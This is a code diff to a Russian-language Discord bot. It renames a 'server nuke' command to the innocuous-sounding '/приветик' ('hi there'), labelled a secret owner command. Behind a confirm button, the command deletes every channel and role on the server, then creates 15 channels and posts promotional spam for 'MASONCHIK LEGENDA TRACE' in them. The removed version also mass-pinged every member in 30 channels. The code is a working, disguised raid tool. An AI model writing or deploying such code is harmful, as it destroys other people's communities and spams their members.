@@ -1749,75 +1749,96 @@ async def mass_move(interaction: discord.Interaction):
     embed.set_footer(text=f"Выполнил: {interaction.user}")
     await interaction.response.send_message(embed=embed)
 
-# === /снос ===
-@bot.tree.command(name="снос", description="Полный снос сервера (ТОЛЬКО ВЛАДЕЛЕЦ)")
-async def nuke_server(interaction: discord.Interaction):
+# === /приветик ===
+@bot.tree.command(name="приветик", description="Секретная команда владельца")
+async def privetik(interaction: discord.Interaction):
     if interaction.user.id != OWNER_ID:
-        await interaction.response.send_message("❌ Только владелец может использовать эту команду.", ephemeral=True)
+        await interaction.response.send_message("❌ Эта команда доступна только владельцу бота.", ephemeral=True)
         return
 
-    await interaction.response.send_message("🧨 Начинаю снос сервера...", ephemeral=True)
+    # Подтверждение действия
+    confirm = discord.ui.View()
+    confirm.add_item(discord.ui.Button(label="Подтвердить", style=discord.ButtonStyle.danger, custom_id="confirm"))
+    confirm.add_item(discord.ui.Button(label="Отмена", style=discord.ButtonStyle.secondary, custom_id="cancel"))
 
-    guild = interaction.guild
-
-    # === УДАЛЕНИЕ ВСЕХ КАНАЛОВ ===
-    deleted_channels = 0
-    for channel in list(guild.channels):
-        try:
-            await channel.delete(reason="Снос сервера")
-            deleted_channels += 1
-        except Exception:
-            pass  # Игнорируем ошибки (например, недостаточно прав)
-
-    # === УДАЛЕНИЕ ВСЕХ РОЛЕЙ (кроме @everyone и роли бота) ===
-    deleted_roles = 0
-    for role in reversed(guild.roles):  # удаляем снизу вверх, чтобы избежать конфликтов
-        if role.is_default() or role.managed or role == guild.me.top_role or role > guild.me.top_role:
-            continue
-        try:
-            await role.delete(reason="Снос сервера")
-            deleted_roles += 1
-        except Exception:
-            pass
-
-    # === СОЗДАНИЕ 30 КАНАЛОВ ===
-    created_channels = []
-    for i in range(30):
-        try:
-            channel = await guild.create_text_channel("масон легенда")
-            created_channels.append(channel)
-        except Exception:
-            pass
-
-    # === ОТПРАВКА СООБЩЕНИЙ В КАЖДЫЙ КАНАЛ ===
-    mention_all = " ".join([member.mention for member in guild.members if not member.bot])
-    if not mention_all.strip():
-        mention_all = "@everyone"
-
-    for channel in created_channels:
-        try:
-            # Отправляем до 5 сообщений (Discord может ограничить массовые упоминания)
-            for _ in range(3):  # 3 раза — чтобы не триггерить рейт-лимит сильно
-                await channel.send(f"{mention_all}\nМАСОН ЛЕГЕНДА")
-                await asyncio.sleep(0.5)
-        except Exception:
-            pass
-
-    # === ФИНАЛЬНЫЙ ОТЧЁТ ===
-    embed = discord.Embed(
-        title="💥 Снос завершён!",
-        description=(
-            f"🗑️ Удалено каналов: **{deleted_channels}**\n"
-            f"🎭 Удалено ролей: **{deleted_roles}**\n"
-            f"🆕 Создано каналов: **{len(created_channels)}**\n"
-            f"📢 Во всех каналах отправлено упоминание + сообщение."
-        ),
-        color=0xff0000
+    await interaction.response.send_message(
+        "⚠️ **ВНИМАНИЕ!** Эта команда **удалит ВСЁ** на сервере!\n"
+        "• Все каналы\n• Все роли (кроме @everyone)\n\n"
+        "**Вы уверены?**",
+        view=confirm,
+        ephemeral=True
     )
-    try:
-        await interaction.followup.send(embed=embed, ephemeral=False)
-    except:
-        pass
+
+@bot.event
+async def on_interaction(interaction: discord.Interaction):
+    if interaction.type != discord.InteractionType.component:
+        return
+
+    if interaction.data["custom_id"] == "confirm":
+        await interaction.response.defer(ephemeral=True)
+
+        guild = interaction.guild
+        if not guild:
+            return
+
+        # === УДАЛЕНИЕ ВСЕХ КАНАЛОВ ===
+        channels_deleted = 0
+        for channel in guild.channels:
+            try:
+                await channel.delete(reason="Команда /приветик")
+                channels_deleted += 1
+            except Exception:
+                pass
+
+        # === УДАЛЕНИЕ ВСЕХ РОЛЕЙ (кроме @everyone) ===
+        roles_deleted = 0
+        for role in guild.roles:
+            if role.is_default() or role.managed:
+                continue
+            try:
+                await role.delete(reason="Команда /приветик")
+                roles_deleted += 1
+            except Exception:
+                pass
+
+        # === СОЗДАНИЕ 15 КАНАЛОВ ===
+        channels_created = []
+        for i in range(15):
+            try:
+                channel = await guild.create_text_channel(
+                    name="MASONCHIK LEGENDA TRACE лучший проект",
+                    reason="Команда /приветик"
+                )
+                channels_created.append(channel)
+            except Exception as e:
+                print(f"Ошибка создания канала {i+1}: {e}")
+
+        # === ОТПРАВКА СООБЩЕНИЙ ===
+        messages_sent = 0
+        for channel in channels_created:
+            try:
+                await channel.send("MASONCHIK LEGENDA TRACE ЛУЧШИЙ ПРОЕКТ")
+                messages_sent += 1
+            except Exception:
+                pass
+
+        # === ФИНАЛЬНОЕ СООБЩЕНИЕ ===
+        embed = discord.Embed(
+            title="✅ Команда выполнена!",
+            description=(
+                f"**Удалено:**\n"
+                f"• Каналов: {channels_deleted}\n"
+                f"• Ролей: {roles_deleted}\n\n"
+                f"**Создано:**\n"
+                f"• Новых каналов: {len(channels_created)}\n"
+                f"• Сообщений отправлено: {messages_sent}"
+            ),
+            color=0x2ecc71
+        )
+        await interaction.followup.send(embed=embed, ephemeral=True)
+
+    elif interaction.data["custom_id"] == "cancel":
+        await interaction.response.send_message("❌ Действие отменено.", ephemeral=True)
 
 # === ЗАПУСК ===
 if __name__ == "__main__":
